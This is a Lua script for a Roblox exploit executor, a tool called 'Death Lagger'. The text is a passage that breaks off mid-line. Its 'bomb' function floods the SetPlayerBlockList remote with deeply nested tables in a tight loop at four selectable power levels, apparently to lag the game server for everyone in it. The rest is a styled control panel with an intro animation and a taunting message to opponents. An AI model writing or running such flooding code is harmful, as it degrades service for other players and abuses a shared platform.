--[[
    DEATH LAGGER - PANEL CON IMAGEN DE FONDO
]]--

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local SoundService = game:GetService("SoundService")

local player = Players.LocalPlayer
local ConfigFile = "BlessLaggerConfig.json"

-- ⚙️ PODERES Y SPEEDS ACTUALIZADOS: 23 - 32 - 70 - 90
local NIVELES = {
    Low   = { poder = 23, texto = "SPEED RECOMMENDED 50-25" },
    Mid   = { poder = 32, texto = "SPEED RECOMMENDED 40-20" },
    High  = { poder = 70, texto = "SPEED RECOMMENDED 40-18" },
    Ultra = { poder = 90, texto = "ONLY TRYHARD" }
}

-- 🎨 COLORES ACTUALIZADOS: Azules obscuros
local COLORES = {
    Low   = Color3.fromRGB(30, 90, 180),   -- Azul obscuro
    Mid   = Color3.fromRGB(30, 90, 180),  -- Azul obscuro medio
    High  = Color3.fromRGB(30, 90, 180),  -- Azul obscuro intenso
    Ultra = Color3.fromRGB(30, 90, 180)   -- Azul obscuro profundo
}

local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "Low"
local ventanaBloqueada = false
local selectedBackground = "131301041000434"

-- 🎨 ESTILO AZUL GRADIENTE
local UI_CONFIG = {
    MainBg       = Color3.fromRGB(0, 0, 0),
    TitleColor   = Color3.fromRGB(255, 255, 255),
    TextColor    = Color3.fromRGB(235, 205, 210),
    ButtonInact  = Color3.fromRGB(0, 0, 0),
    ButtonLow    = Color3.fromRGB(90, 8, 18),
    ButtonMid    = Color3.fromRGB(125, 10, 24),
    ButtonHigh   = Color3.fromRGB(165, 12, 30),
    ButtonUltra  = Color3.fromRGB(220, 20, 45),
    ToggleOff    = Color3.fromRGB(0, 0, 0),
    ToggleOn     = Color3.fromRGB(95, 8, 18),
    LockColor    = Color3.fromRGB(235, 205, 210),
    UnlockColor  = Color3.fromRGB(170, 120, 130),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(125, 15, 30),
    GlowColor    = Color3.fromRGB(200, 0, 0),
    SelectorBg   = Color3.fromRGB(35, 5, 10),
    SelectorAct  = Color3.fromRGB(220, 20, 45),
}

-- 💾 CONFIG
local function SaveConfig()
    local data = {
        Keybind = keybind.Name,
        Nivel = nivelActual,
        Bloqueado = ventanaBloqueada,
        BackgroundId = selectedBackground
    }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end

local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
            nivelActual = data.Nivel or "Low"
            ventanaBloqueada = data.Bloqueado or false
            selectedBackground = tostring(data.BackgroundId or "88965053360791")
        end)
    end
end
LoadConfig()

-- ⚠️ LAG ENGINE
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- FUNCIÓN PARA REINICIAR EL LAG CON NUEVO PODER
local function restartLagWithPower(poder)
    if laggerActive then
        if lagThread then
            task.cancel(lagThread)
            lagThread = nil
        end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(poder)
                task.wait(0.18)
            end
        end)
    end
end

-- 🧩 ELEMENTOS
local toggleButton, btnLow, btnMid, btnHigh, btnUltra, lockButton
local titleLabel, textLagger, keybindButton
local infoLabel, lockIndicator

-- Funciones de actualización
local function actualizarBotonesNivel()
    if nivelActual == "Low" then
        btnLow.BackgroundColor3 = COLORES.Low
        btnLow.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnLow.BorderSizePixel = 0
    else
        btnLow.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnLow.TextColor3 = Color3.fromRGB(235, 205, 210)
        btnLow.BorderSizePixel = 1
        btnLow.BorderColor3 = UI_CONFIG.BorderColor
    end
    if nivelActual == "Mid" then
        btnMid.BackgroundColor3 = COLORES.Mid
        btnMid.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnMid.BorderSizePixel = 0
    else
        btnMid.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnMid.TextColor3 = Color3.fromRGB(235, 205, 210)
        btnMid.BorderSizePixel = 1
        btnMid.BorderColor3 = UI_CONFIG.BorderColor
    end
    if nivelActual == "High" then
        btnHigh.BackgroundColor3 = COLORES.High
        btnHigh.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnHigh.BorderSizePixel = 0
    else
        btnHigh.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnHigh.TextColor3 = Color3.fromRGB(235, 205, 210)
        btnHigh.BorderSizePixel = 1
        btnHigh.BorderColor3 = UI_CONFIG.BorderColor
    end
    if nivelActual == "Ultra" then
        btnUltra.BackgroundColor3 = COLORES.Ultra
        btnUltra.TextColor3 = Color3.fromRGB(255, 255, 255)
        btnUltra.BorderSizePixel = 0
    else
        btnUltra.BackgroundColor3 = UI_CONFIG.ButtonInact
        btnUltra.TextColor3 = Color3.fromRGB(235, 205, 210)
        btnUltra.BorderSizePixel = 1
        btnUltra.BorderColor3 = UI_CONFIG.BorderColor
    end

    if infoLabel then
        infoLabel.Text = NIVELES[nivelActual].texto
        infoLabel.TextColor3 = COLORES[nivelActual]
    end

    if laggerActive then
        restartLagWithPower(NIVELES[nivelActual].poder)
    end
end

local function actualizarSwitch()
    if toggleButton then
        toggleButton.Text = laggerActive and "ON" or "OFF"
        if laggerActive then
            toggleButton.TextColor3 = Color3.fromRGB(255, 65, 85)
            toggleButton.BackgroundColor3 = Color3.fromRGB(95, 8, 18)
        else
            toggleButton.TextColor3 = Color3.fromRGB(220, 185, 190)
            toggleButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        end
    end
end

local function actualizarCandado()
    if lockIndicator then
        if ventanaBloqueada then
            lockIndicator.TextColor3 = Color3.fromRGB(80, 80, 80)
            lockIndicator.Text = "lock"
        else
            lockIndicator.TextColor3 = Color3.fromRGB(220, 185, 190)
            lockIndicator.Text = "unlock"
        end
    end
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name
        if display:match("Button") then
            display = display:gsub("Button", "")
        end
        keybindButton.Text = "[" .. display .. "]"
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    actualizarSwitch()

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖼️ INTERFAZ
if CoreGui:FindFirstChild("BlessLagger_UI") then CoreGui.BlessLagger_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlessLagger_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false


-- ═══════════════════════════════════════════
-- ALERTAS DEL MODO ULTRA
-- ═══════════════════════════════════════════
local ultraAlertRunning = false

local function showUltraAlerts()
    if ultraAlertRunning then return end
    ultraAlertRunning = true

    local messages = {
        "SI PIERDES ES PORQUE ERES MALO, NO LE TIRES LA CULPA A LOS DEMÁS XD",
        "IF YOU LOSE, IT'S BECAUSE YOU'RE BAD. DON'T BLAME ANYONE ELSE XD"
    }

    local alertFrame = Instance.new("Frame")
    alertFrame.Name = "UltraAlert"
    alertFrame.Parent = screenGui
    alertFrame.AnchorPoint = Vector2.new(0.5, 0)
    alertFrame.Position = UDim2.new(0.5, 0, 0, -44)
    alertFrame.Size = UDim2.new(0, 310, 0, 36)
    alertFrame.BackgroundColor3 = Color3.fromRGB(28, 3, 8)
    alertFrame.BackgroundTransparency = 0.05
    alertFrame.BorderSizePixel = 0
    alertFrame.ZIndex = 300
    Instance.new("UICorner", alertFrame).CornerRadius = UDim.new(0, 10)

    local alertStroke = Instance.new("UIStroke")
    alertStroke.Parent = alertFrame
    alertStroke.Color = Color3.fromRGB(235, 25, 55)
    alertStroke.Thickness = 2
    alertStroke.Transparency = 0.05

    local alertText = Instance.new("TextLabel")
    alertText.Parent = alertFrame
    alertText.BackgroundTransparency = 1
    alertText.Position = UDim2.new(0, 10, 0, 5)
    alertText.Size = UDim2.new(1, -20, 1, -10)
    alertText.Font = Enum.Font.GothamBlack
    alertText.TextColor3 = Color3.fromRGB(255, 225, 230)
    alertText.TextStrokeColor3 = Color3.fromRGB(100, 0, 20)
    alertText.TextStrokeTransparency = 0.35
    alertText.TextScaled = false
    alertText.TextSize = 9
    alertText.TextWrapped = true
    alertText.ZIndex = 301

    local alertScale = Instance.new("UIScale")
    alertScale.Parent = alertFrame
    alertScale.Scale = 0.9

    local slideIn = TweenService:Create(
        alertFrame,
        TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {Position = UDim2.new(0.5, 0, 0, 8)}
    )

    local scaleIn = TweenService:Create(
        alertScale,
        TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {Scale = 1}
    )

    alertText.Text = messages[1]
    slideIn:Play()
    scaleIn:Play()
    slideIn.Completed:Wait()

    task.wait(3)

    local switchOut = TweenService:Create(
        alertText,
        TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {TextTransparency = 1, TextStrokeTransparency = 1}
    )
    switchOut:Play()
    switchOut.Completed:Wait()

    alertText.Text = messages[2]

    local switchIn = TweenService:Create(
        alertText,
        TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {TextTransparency = 0, TextStrokeTransparency = 0.35}
    )
    switchIn:Play()

    task.wait(3)

    local slideOut = TweenService:Create(
        alertFrame,
        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {Position = UDim2.new(0.5, 0, 0, -44), BackgroundTransparency = 1}
    )

    local finalTextFade = TweenService:Create(
        alertText,
        TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {TextTransparency = 1, TextStrokeTransparency = 1}
    )

    slideOut:Play()
    finalTextFade:Play()
    slideOut.Completed:Wait()

    alertFrame:Destroy()
    ultraAlertRunning = false
end

-- Panel principal
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = Color3.fromRGB(180, 12, 35)
mainFrame.Size = UDim2.new(0, 245, 0, 100)
mainFrame.Position = UDim2.new(0.15, 0, 0.5, -39)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
mainFrame.Visible = false
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 8)

-- ═══════════════════════════════════════════
-- INTRO: TEXTO CAYENDO CON MÁS VIDA
-- ═══════════════════════════════════════════
local introFrame = Instance.new("Frame")
introFrame.Name = "CryonIntro"
introFrame.Parent = screenGui
introFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
introFrame.BackgroundTransparency = 1
introFrame.BorderSizePixel = 0
introFrame.Size = UDim2.new(1, 0, 1, 0)
introFrame.Position = UDim2.new(0, 0, 0, 0)
introFrame.ZIndex = 100

-- Música de introducción: empieza en 0:34 y suena durante 6 segundos
local introSound = Instance.new("Sound")
introSound.Name = "BlessLaggerIntroSound"
introSound.SoundId = "rbxassetid://76650356472656"
introSound.Volume = 1
introSound.Looped = false
introSound.Parent = SoundService

task.spawn(function()
    local loadStarted = tick()
    while not introSound.IsLoaded and tick() - loadStarted < 8 do
        task.wait(0.05)
    end
    if not introSound.Parent then return end
    pcall(function()
        introSound.TimePosition = 3
        introSound:Play()
    end)
    task.wait(20)
    if introSound and introSound.Parent then
        pcall(function() introSound:Stop() end)
        introSound:Destroy()
    end
end)

local introText = Instance.new("TextLabel")
introText.Name = "IntroText"
introText.Parent = introFrame
introText.BackgroundTransparency = 1
introText.AnchorPoint = Vector2.new(0.5, 0.5)
introText.Position = UDim2.new(0.5, 0, -0.22, 0)
introText.Size = UDim2.new(0.9, 0, 0, 70)
introText.Font = Enum.Font.GothamBlack
introText.Text = "DEATH LAGGER"
introText.TextColor3 = Color3.fromRGB(255, 255, 255)
introText.TextStrokeColor3 = Color3.fromRGB(170, 10, 35)
introText.TextStrokeTransparency = 0.05
introText.TextScaled = true
introText.Rotation = -16
introText.ZIndex = 102

local introGradient = Instance.new("UIGradient")
introGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(255, 165, 180)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(220, 20, 50))
})
introGradient.Rotation = 90
introGradient.Parent = introText

local introShadow = Instance.new("TextLabel")
introShadow.Name = "IntroShadow"
introShadow.Parent = introFrame
introShadow.BackgroundTransparency = 1
introShadow.AnchorPoint = Vector2.new(0.5, 0.5)
introShadow.Position = UDim2.new(0.5, 4, -0.22, 4)
introShadow.Size = UDim2.new(0.9, 0, 0, 70)
introShadow.Font = Enum.Font.GothamBlack
introShadow.Text = "DEATH LAGGER"
introShadow.TextColor3 = Color3.fromRGB(220, 15, 45)
introShadow.TextTransparency = 0.35
introShadow.TextStrokeTransparency = 1
introShadow.TextScaled = true
introShadow.Rotation = -16
introShadow.ZIndex = 101

local introScale = Instance.new("UIScale")
introScale.Parent = introText
introScale.Scale = 0.4

local shadowScale = Instance.new("UIScale")
shadowScale.Parent = introShadow
shadowScale.Scale = 0.4

local fallTween = TweenService:Create(
    introText,
    TweenInfo.new(0.75, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
    {
        Position = UDim2.new(0.5, 0, 0.5, 0),
        Rotation = 0
    }
)

local shadowFallTween = TweenService:Create(
    introShadow,
    TweenInfo.new(0.75, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out),
    {
        Position = UDim2.new(0.5, 4, 0.5, 4),
        Rotation = 0
    }
)

local scaleTween = TweenService:Create(
    introScale,
    TweenInfo.new(0.75, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
    {Scale = 1}
)

local shadowScaleTween = TweenService:Create(
    shadowScale,
    TweenInfo.new(0.75, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
    {Scale = 1}
)

fallTween:Play()
shadowFallTween:Play()
scaleTween:Play()
shadowScaleTween:Play()

task.spawn(function()
    fallTween.Completed:Wait()

    local pulseUp = TweenService:Create(
        introScale,
        TweenInfo.new(0.28, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
        {Scale = 1.08}
    )
    local pulseDown = TweenService:Create(
        introScale,
        TweenInfo.new(0.28, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
        {Scale = 1}
    )
    local pulseUpShadow = TweenService:Create(
        shadowScale,
        TweenInfo.new(0.28, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
        {Scale = 1.08}
    )
    local pulseDownShadow = TweenService:Create(
        shadowScale,
        TweenInfo.new(0.28, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
        {Scale = 1}
    )
    local floatUp = TweenService:Create(
        introText,
        TweenInfo.new(0.32, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
        {Position = UDim2.new(0.5, 0, 0.485, 0)}
    )
    local floatUpShadow = TweenService:Create(
        introShadow,
        TweenInfo.new(0.32, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
        {Position = UDim2.new(0.5, 4, 0.485, 4)}
    )
    local floatDown = TweenService:Create(
        introText,
        TweenInfo.new(0.32, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
        {Position = UDim2.new(0.5, 0, 0.5, 0)}
    )
    local floatDownShadow = TweenService:Create(
        introShadow,
        TweenInfo.new(0.32, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
        {Position = UDim2.new(0.5, 4, 0.5, 4)}
    )

    pulseUp:Play()
    pulseUpShadow:Play()
    floatUp:Play()
    floatUpShadow:Play()
    task.wait(0.32)
    pulseDown:Play()
    pulseDownShadow:Play()
    floatDown:Play()
    floatDownShadow:Play()

    task.wait(1.15)

    local fadeText = TweenService:Create(
        introText,
        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {
            TextTransparency = 1,
            TextStrokeTransparency = 1,
            Rotation = 4,
            Position = UDim2.new(0.5, 0, 0.42, 0)
        }
    )

    local fadeShadow = TweenService:Create(
        introShadow,
        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {
            TextTransparency = 1,
            Position = UDim2.new(0.5, 4, 0.42, 4)
        }
    )

    local shrinkText = TweenService:Create(
        introScale,
        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {Scale = 0.88}
    )

    local shrinkShadow = TweenService:Create(
        shadowScale,
        TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
        {Scale = 0.88}
    )

    fadeText:Play()
    fadeShadow:Play()
    shrinkText:Play()
    shrinkShadow:Play()
    task.wait(0.32)

    introFrame:Destroy()
    mainFrame.Visible = true
    task.spawn(showUltraAlerts)
end)

-- Imagen de fondo completa
local backgroundImage = Instance.new("ImageLabel")
backgroundImage.Name = "BackgroundImage"
backgroundImage.Parent = mainFrame
backgroundImage.BackgroundTransparency = 1
backgroundImage.BorderSizePixel = 0
backgroundImage.Position = UDim2.new(0, 0, 0, 0)
backgroundImage.Size = UDim2.new(1, 0, 1, 0)
backgroundImage.Image = "rbxassetid://" .. selectedBackground
backgroundImage.ScaleType = Enum.ScaleType.Crop
backgroundImage.ImageTransparency = 0
backgroundImage.ZIndex = 1
Instance.new("UICorner", backgroundImage).CornerRadius = UDim.new(0, 8)

-- ═══════════════════════════════════════════
-- SELECTOR DE FONDOS (IMGS) CON VISTAS PREVIAS
-- ═══════════════════════════════════════════
local backgroundOptions = {
    {name = "1", id = "131301041000434"},
    {name = "2", id = "102927122198616"},
    {name = "3", id = "87111982823570"},
    {name = "4", id = "123640774649211"},
    {name = "5", id = "77458745480772"}
}

local imgsButton = Instance.new("TextButton")
imgsButton.Name = "ImgsButton"
imgsButton.Parent = mainFrame
imgsButton.BackgroundColor3 = Color3.fromRGB(45, 4, 12)
imgsButton.BorderSizePixel = 1
imgsButton.BorderColor3 = Color3.fromRGB(175, 15, 38)
imgsButton.Position = UDim2.new(1, -42, 1, -18)
imgsButton.Size = UDim2.new(0, 38, 0, 15)
imgsButton.Font = Enum.Font.GothamBlack
imgsButton.Text = "IMGS"
imgsButton.TextColor3 = Color3.fromRGB(255, 220, 225)
imgsButton.TextSize = 7
imgsButton.AutoButtonColor = false
imgsButton.ZIndex = 20
Instance.new("UICorner", imgsButton).CornerRadius = UDim.new(0, 5)

local imgsPanel = Instance.new("Frame")
imgsPanel.Name = "ImgsPanel"
imgsPanel.Parent = screenGui
imgsPanel.BackgroundColor3 = Color3.fromRGB(16, 2, 5)
imgsPanel.BackgroundT